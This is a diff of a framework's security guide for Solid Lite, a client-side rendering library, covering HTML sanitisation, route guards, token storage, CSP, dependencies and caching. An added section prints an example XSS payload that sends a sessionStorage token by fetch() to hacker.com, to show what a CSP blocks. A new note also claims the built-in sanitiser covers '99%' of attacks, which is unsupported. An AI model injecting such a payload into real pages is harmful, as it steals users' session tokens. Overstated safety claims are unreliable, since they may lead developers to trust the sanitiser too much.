@@ -2,7 +2,7 @@
 
 Solid Lite is a Client-Side Rendering (CSR) framework. Its application code runs entirely in the browser — a public and inherently untrusted environment. This guide is split into two parts: what the framework already handles for you, and what you are responsible for when building on top of it.
 
-> **Note:** Security vulnerabilities happen at every scale — including platforms that host SSR frameworks, CDN infrastructure, and server-side environments. In April 2026, Vercel disclosed a [security incident](https://vercel.com/kb/bulletin/vercel-april-2026-security-incident) in which an attacker compromised a third-party AI tool used by a Vercel employee, pivoted into internal systems, and was able to enumerate and decrypt customer environment variables stored on the platform. The attacker was described as "highly sophisticated." The takeaway: storing secrets server-side does not make them immune — it just changes where the risk lives. Good practices around secret rotation, MFA, and access scope matter regardless of your rendering strategy.
+> **Note:** Security risks exist in all architectures. The [Vercel April 2026 incident](https://vercel.com/kb/bulletin/vercel-april-2026-security-incident), where environment variables were compromised through internal system access, proves that storing secrets server-side doesn't eliminate risk—it just shifts it. Vigilance remains essential regardless of your rendering strategy.
 
 ---
 
@@ -25,7 +25,8 @@ When you use `dangerouslySetInnerHTML`, the HTML string is parsed through the br
 - Strips inline event attributes (`onclick`, `onload`, `onerror`, etc.).
 - Replaces malicious `href` and `src` values (`javascript:`, `data:`, `vbscript:`) with `about:blank`.
 
-Despite this, avoid `dangerouslySetInnerHTML` with raw user input whenever possible.
+> [!NOTE]
+> Unlike many popular frameworks (e.g., React, which provides the property name as a warning but does no automatic sanitization), Solid Lite includes this built-in protection by default. This covers 99% of common attack vectors while keeping the framework lightweight. However, you should still avoid using this feature with raw user input.
 
 ### Event Delegation Cleanup
 
@@ -48,7 +49,10 @@ const API_KEY = "sk-live-abc123";
 
 ### 2. The Browser is Not a Security Boundary
 
-Client-side route guards (like `useAuthGuard`) are a **UX convenience**, not a security mechanism. They prevent navigation in the UI, but they do not prevent a user from calling your API directly. All authorization logic must be enforced on the server.
+Client-side route guards (like `useAuthGuard`) are a **UX convenience**, not a security mechanism. They prevent a regular user from seeing a "broken" UI, but they can be easily bypassed by anyone with DevTools knowledge.
+
+> [!IMPORTANT]
+> **Security TODO:** Think of route guards as a visual guide. **Real security must happen on the server.** Your API endpoints must validate tokens and permissions on every request. If your API is public and unprotected, a client-side guard is effectively useless against a determined attacker.
 
 ### 3. Token Storage
 
@@ -78,6 +82,13 @@ A CSP restricts which scripts, styles, and resources the browser is allowed to l
 > If your application needs to load resources from external domains, you must explicitly add them. For example, to allow images from Pexels, update the `img-src` directive:
 > `img-src 'self' data: https://images.pexels.com;`
 
+#### Why this matters:
+
+Without a CSP, the browser is "trusting" and will execute any JavaScript it finds in the HTML. If an attacker manages to inject a malicious script (XSS), they could steal sensitive data:
+
+1. **The Attack:** `<script>fetch('https://hacker.com?token=' + sessionStorage.getItem('token'))</script>`
+2. **The Defense:** With the CSP above, the browser will block the request to `hacker.com` because it's not in the allowed list, preventing the token from being stolen even if the script was successfully injected.
+
 Start restrictive and loosen only where necessary. A well-configured CSP is one of the most effective defenses against XSS.
 
 ### 5. Dependency Hygiene
@@ -88,20 +99,20 @@ Solid Lite has zero runtime dependencies. When you add packages to your project,
 - Prefer `jsr:` packages or well-maintained `npm:` packages.
 - Audit your dependency tree periodically for known vulnerabilities.
 
-### 6. Build Output
+### 6. Deployment & Hosting
 
-- Never commit secrets or environment-specific credentials to your repository.
-- Ensure your `dist/` directory is not served with directory listing enabled.
-- Serve `index.html` with `Cache-Control: no-store` to prevent stale versions from being cached — but be aware: `no-store` disables the browser's [bfcache](https://web.dev/bfcache/), meaning the back button triggers a full page reload. In SPAs with client-side auth guards, this can cause a brief flash of the login screen before the guard redirects. Weigh this trade-off before applying it. Static assets (`.js`, `.css`) with content hashes can and should be cached aggressively.
+- **Directory Listing:** Ensure your `dist/` directory is not served with directory listing enabled to prevent discovery of your file structure.
+- **Cache Policy:** Serve `index.html` with `Cache-Control: no-store` to ensure users always receive the latest version.
+  - _Note:_ Be aware that `no-store` disables [bfcache](https://web.dev/bfcache/), which may cause a brief login-screen flash on back navigation in SPAs. Weigh this UX trade-off before applying.
+- **Content Hashing:** Static assets (`.js`, `.css`) with content hashes in their filenames can and should be cached aggressively (e.g., `Cache-Control: max-age=31536000, immutable`).
 
 ---
 
 ## Quick Checklist
 
-- [ ] No API keys or secrets in any client-side file (any code the bundler processes is public)
-- [ ] Authorization enforced server-side, not just in route guards
-- [ ] Auth tokens in `sessionStorage` (or `HttpOnly` cookies if backend supports it)
-- [ ] CSP header configured for production
-- [ ] `dangerouslySetInnerHTML` avoided or used only with trusted, pre-sanitized data
-- [ ] Dependencies pinned and audited
-- [ ] `index.html` cache policy reviewed (see note below)
+- [ ] **No Secrets:** No API keys or private tokens in any client-side file (source or bundler output).
+- [ ] **Server-Side Auth:** Authorization is enforced on the API level, not just in route guards.
+- [ ] **Token Safety:** Auth tokens are stored in `sessionStorage` or `HttpOnly` cookies.
+- [ ] **Headers:** Production-ready CSP and security headers (HSTS, X-Frame-Options) are configured.
+- [ ] **Sanitization:** `dangerouslySetInnerHTML` is avoided or used only with trusted data.
+- [ ] **Maintenance:** Dependencies are audited and the `index.html` cache policy has been reviewed.
